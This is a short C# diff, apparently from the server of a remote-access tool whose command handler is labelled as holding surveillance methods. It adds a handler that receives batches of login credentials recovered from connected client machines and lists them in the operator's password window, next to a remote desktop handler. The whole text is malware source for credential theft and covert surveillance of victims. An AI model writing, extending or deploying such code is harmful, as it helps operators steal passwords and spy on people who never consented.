@@ -4,12 +4,27 @@ using System.Threading;
 using System.Windows.Forms;
 using xServer.Core.Helper;
 using xServer.Core.Packets.ClientPackets;
+using xServer.Core.Recovery.Helper;
 
 namespace xServer.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
     public static partial class CommandHandler
     {
+        public static void HandlePasswordResponse(Client client, PasswordResponse packet)
+        {
+            if (client.Value.FrmPass == null)
+                return;
+
+            if (packet.Passwords == null)
+                return;
+
+            foreach (LoginInfo login in packet.Passwords)
+            {
+                // add them to the listview of frmpass
+                client.Value.FrmPass.AddPassword(login, client);
+            }
+        }
         public static void HandleRemoteDesktopResponse(Client client, DesktopResponse packet)
         {
             if (client.Value.FrmRdp == null)
